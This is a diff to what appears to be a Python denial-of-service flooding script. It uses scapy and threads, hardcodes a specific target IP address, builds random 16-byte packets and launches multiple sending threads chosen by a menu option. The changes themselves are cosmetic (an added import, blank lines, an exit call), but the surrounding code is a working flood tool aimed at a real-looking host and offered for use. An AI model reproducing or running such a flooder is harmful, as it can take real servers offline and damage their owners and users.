@@ -4,7 +4,7 @@ import threading
 import sys
 import argparse
 from scapy.all import *
-
+import time
 
 
 ip = '82.200.161.178'
@@ -24,6 +24,7 @@ def run():
 			print(i +" Sent!!!")
 		except:
 			print("[!] Error!!!")
+
 
 def run2():
 	data = random._urandom(16)
@@ -53,9 +54,11 @@ for y in range(threads):
 	if choice == '1':
 		th = threading.Thread(target = run)
 		th.start()
+
 	elif choice == '2':
 		th = threading.Thread(target = run2)
 		th.start()
 	elif choice == '3':
 	    th = threading.Thread(target = run3)
 	    th.start()	
+sys.exit(0)
